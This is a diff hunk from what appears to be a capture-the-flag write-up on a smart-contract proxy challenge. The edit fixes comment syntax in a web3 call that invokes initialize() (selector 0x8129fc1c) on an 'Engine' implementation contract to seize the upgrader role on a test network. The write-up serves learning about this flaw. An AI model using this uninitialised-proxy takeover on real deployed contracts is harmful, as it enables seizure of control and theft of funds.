@@ -261,7 +261,7 @@ Deploy the attack contract and **get the signature of our attack() function**. S
 For being upgrader, send the transaction to the `Engine` contract with the `0x8129fc1c` value which is refers to **keccak-256 signature hash** of `initialize()` function. See the transaction on [etherscan](https://sepolia.etherscan.io/tx/0xed3ec7742edbac93cbd5984fd86a78671c1036a26fe383bdcc7c18f5def4fbb6).
 
 ```js
-await web3.eth.sendTransaction({from: player,to: address,data: '0x8129fc1c' // initialize()})
+await web3.eth.sendTransaction({from: player,to: address,data: '0x8129fc1c' /* initialize()*/ })
 ```
 
 ```js
